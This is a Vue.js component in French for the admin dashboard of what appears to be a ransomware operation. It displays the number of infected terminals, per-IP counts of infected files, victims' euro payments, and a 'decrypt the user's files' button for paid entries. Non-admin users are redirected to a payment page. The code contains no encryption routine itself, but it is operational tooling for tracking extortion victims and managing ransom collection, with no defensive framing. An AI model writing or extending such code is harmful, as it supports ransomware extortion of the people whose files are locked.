<template>

    <div class="layout_horizontal">
        <Header/>
        <div class="home">

            <p v-if="error">{{ error }}</p>

            <div v-else>
                <div class="card paragraphe">
                    <p class="text-center medium">
                        terminaux&nbsp;infectés&nbsp;
                    </p>
                    <h1 class="text-danger text-center large">{{ infectedTerminals }}</h1>
                    <p class="text-amber text-center small">{{ moment(new Date()).format("L HH:mm") }}</p>
                </div>
                <div class="grid">
                    <stat-card v-if="infectedFiles.length > 0">
                        <p v-for="log in infectedFiles" class="paragraphe small">
                            <span class="text-amber">{{ moment(log.createdAt).format("L HH:mm") }}</span>&nbsp;-&nbsp;
                            <span class="text-danger">{{ log.numberInfectedFile }}</span>&nbsp;fichiers&nbsp;infectés,&nbsp;ip:&nbsp;
                            <span class="text-success">{{ log.ip }}</span>
                        </p>
                    </stat-card>
                    <stat-card v-if="payments.length > 0">
                        <table>
                            <tr v-for="log in payments" class="paragraphe small">
                                <td>
                                    <span class="text-amber">{{ moment(log.createdAt).format("L HH:mm") }}</span>&nbsp;-&nbsp;
                                </td>
                                <td>
                                    paiement de <span class="text-danger">{{ log.amount }}&nbsp;€</span>
                                </td>
                                <td>
                                    ip:&nbsp;<span class="text-success">{{ log.user.ip }}</span>
                                </td>
                                <td>
                                    <p v-if="log.paymentStatus === 'payment_success'">
                                        <button class="action-button btn-small dashboard medium">Décrypter les fichiers de l'utilisateur</button>
                                    </p>
                                    <p v-if="log.paymentStatus === 'files_decrypted'" class="flash-success btn-small dashboard medium">Transaction terminée</p>
                                </td>
                            </tr>
                        </table>
                    </stat-card>
                </div>
            </div>

        </div>
    </div>

</template>

<script lang="ts">
import {defineComponent} from 'vue';
import Header from '../components/commons/Header.vue';
import HttpRequest from '../core/services/http/HttpRequest';
import {isAdmin, isLogged, isTokenExpired} from '../core/services/utils/auth';
import StatCard from "../components/stats/StatCard.vue";
import moment from 'moment'

export default defineComponent({
    name: 'Home',
    data() {
        return {
            error: null as string | null,
            token: isLogged(),
            infectedFiles: [],
            payments: [],
            infectedTerminals: 0,
            moment: moment
        }
    },
    components: {
        Header,
        StatCard
    },
    methods: {
        call(token: string | null): void {
            HttpRequest.get('/logs', token)
                .then((response: any) => {
                    this.payments = response.data.transactions
                    this.infectedFiles = response.data.logs
                    this.infectedTerminals = response.data.infectedTerminals
                    if([400, 404].includes(response.data.status_code)) {
                        this.$router.push('/*')
                    }
                })
                .catch((error: any) => {
                    this.error = error;
                });
        }
    },
    created() {

        if (this.token) {
            isTokenExpired(this.token);
            if(!isAdmin(this.token)) {
                this.$router.push('/payment');
            } else {
                this.call(this.token);
            }
        } else {
            this.$router.push('/login')
        }
    }
});
</script>

<style lang="scss" scoped>
// Your scoped scss
</style>
